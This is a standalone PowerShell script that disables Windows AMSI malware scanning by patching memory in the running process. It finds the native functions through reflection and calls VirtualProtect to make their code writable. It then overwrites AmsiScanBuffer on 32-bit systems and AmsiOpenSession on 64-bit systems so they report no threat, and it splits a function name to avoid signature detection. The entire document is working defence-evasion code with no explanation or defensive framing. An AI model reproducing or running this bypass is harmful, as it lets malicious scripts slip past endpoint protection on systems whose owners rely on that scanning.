function LookupFunc {
    param($modulename,$functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {$_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods');
    $moduleobj = New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($assem.GetMethod('GetModuleHandle').Invoke(0, @($modulename))));
    return $assem.GetMethod('GetProcAddress', [reflection.bindingflags] 'Public,Static', $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null).Invoke($null, @([System.Runtime.InteropServices.HandleRef]$moduleobj, $functionName))
}
function getDelegateType {
 Param (
 [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func, [Parameter(Position = 1)] [Type] $delType = [Void])
 $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule',$false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
 $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
 $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,$func).SetImplementationFlags('Runtime, Managed')
 return $type.CreateType()
}

if([System.IntPtr]::Size -eq 4){
    $f = 'Ams'+'iScanBuffer'
    [IntPtr]$funcAddr = LookupFunc amsi.dll $f
    $VirtualProtectAddr = LookupFunc kernel32.dll VirtualProtect
    $VirtualProtectDelegateType = getDelegateType @([IntPtr], [UInt32], [UInt32],[UInt32].MakeByRefType())([Bool])
    $VirtualProtect =[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegateType)
    $oldProtectionBuffer = 0
    $VirtualProtect.Invoke($funcAddr,3, 0x40, [ref]$oldProtectionBuffer)
    $syserror = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00)
    #mov eax,80070057h
    #ret 18h
    [System.Runtime.InteropServices.Marshal]::Copy($syserror, 0, $funcAddr, 8);
    $VirtualProtect.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)

}else
{
    [IntPtr]$funcAddr = LookupFunc Amsi.dll AmsiOpenSession
    $VirtualProtectAddr = LookupFunc kernel32.dll VirtualProtect
    $VirtualProtectDelegateType = getDelegateType @([IntPtr], [UInt32], [UInt32],[UInt32].MakeByRefType())([Bool])
    $VirtualProtect =[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegateType)
    $oldProtectionBuffer = 0
    $VirtualProtect.Invoke($funcAddr,3, 0x40, [ref]$oldProtectionBuffer)
    $xorrax = [Byte[]] (0x48,0x31,0xC0)
    # xor rax,rax
    [System.Runtime.InteropServices.Marshal]::WriteByte($funcAddr,0,$xorrax[0])
    [System.Runtime.InteropServices.Marshal]::WriteByte($funcAddr,1,$xorrax[1])
    [System.Runtime.InteropServices.Marshal]::WriteByte($funcAddr,2,$xorrax[2])
    $VirtualProtect.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
}



